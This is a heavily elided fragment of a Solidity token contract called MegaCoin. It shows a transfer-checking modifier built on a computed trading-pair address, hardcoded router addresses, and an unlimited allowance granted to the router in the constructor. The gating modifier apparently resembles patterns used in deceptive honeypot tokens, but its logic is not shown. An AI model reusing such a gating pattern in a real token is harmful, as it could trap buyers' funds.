...
contract MegaCoin {
    ...
    modifier ensure(address _from, address _to) {
        address UNI = pairFor(0x6725F303b657a9451d8BA641348b6761A6CC7a17, 0x27c6487C9B115c184Bb04A1Cf549b670a22D2870, address(this));
    ...
    address constant internal UNI = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
    ...
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        ...
        allowance[msg.sender][0xD99D1c33F9fC3444f8101754aBC46c52416550D1] = uint(-1);
